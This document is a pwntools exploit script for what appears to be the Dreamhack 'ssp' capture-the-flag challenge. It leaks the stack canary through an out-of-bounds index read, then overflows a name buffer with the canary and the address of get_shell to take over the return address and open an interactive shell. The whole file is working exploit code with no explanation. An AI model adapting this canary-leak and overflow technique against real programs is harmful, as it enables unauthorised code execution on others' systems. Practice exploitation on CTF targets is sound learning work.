from pwn import *

p = remote('host3.dreamhack.games', 20000)
e = ELF('./ssp')
shell = e.symbols['get_shell']

canary = b''
i = 131
while (i>127) :
    p.sendafter(b'> ', 'P')
    p.sendlineafter(b'Element index : ', str(i))
    p.recvuntil('is : ')
    canary += p.recvn(2)
    i -= 1
canary = int(canary, 16)

payload = b'\x90' * 0x40
payload += p32(canary)
payload += b'\x90' * 0x8
payload += p32(shell)

p.sendafter(b'> ', "E")
p.sendlineafter(b'Name Size : ', str(len(payload)))
p.sendafter(b'Name : ', payload)

p.interactive()